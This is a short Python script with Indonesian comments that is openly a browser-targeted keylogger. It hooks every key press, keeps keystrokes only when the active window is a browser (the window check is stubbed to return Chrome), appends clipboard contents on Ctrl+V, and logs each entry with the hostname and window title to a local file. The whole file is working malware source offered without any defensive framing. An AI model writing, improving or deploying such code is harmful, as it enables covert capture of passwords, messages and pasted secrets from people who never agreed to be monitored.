import socket
import pyperclip
import keyboard

# Inisialisasi variabel key_log
key_log = ""


def act_win_pn():
    """ Simulasi mendapatkan jendela aktif """
    return (1234, "chrome.exe", "Google Chrome")


def browserList(text):
    """ Periksa apakah proses berada dalam daftar target browser """
    target_browsers = ["chrome.exe", "brave.exe", "firefox.exe", "safari.exe", "msedge.exe"]
    return text.lower() in target_browsers


def GetTextFromClipboard():
    """ Mengambil teks dari clipboard """
    return pyperclip.paste()


def save_log(log, text, caption):
    """ Simpan log ke file lokal dengan format JSON-like """
    global key_log
    r = {
        'gid': "sType",
        'pid': "gType",
        'pcname': socket.gethostname(),
        'processname': text,
        'windowname': caption,
        'data': log,
    }
    with open("keylog.txt", "a", encoding="utf-8") as file:
        file.write(str(r) + "\n")  # Simpan sebagai string JSON-like
    key_log = ""  # Reset log setelah menyimpan


def OnKeyboardEvent(event):
    """ Fungsi event listener keyboard """
    global key_log
    (pid, text, caption) = act_win_pn()

    if browserList(text):
        key = event.name

        if keyboard.is_pressed('ctrl'):
            key = f"<{event.name}>"
        elif key == 'enter':
            key = "\n"
        elif len(key) == 1:
            key = key
        else:
            key = f"<{event.name}>"

        # Jika pengguna menekan Ctrl+V, tambahkan isi clipboard
        if keyboard.is_pressed('ctrl') and event.name.lower() == 'v':
            key += GetTextFromClipboard()

        key_log += key

        # Simpan log saat tombol Enter ditekan atau ada sisa log
        if key == "\n" and len(key_log):
            save_log(key_log, text, caption)
        elif len(key_log):
            save_log(key_log, text, caption)

    return True


# Jalankan keylogger
keyboard.on_press(OnKeyboardEvent)
keyboard.wait()
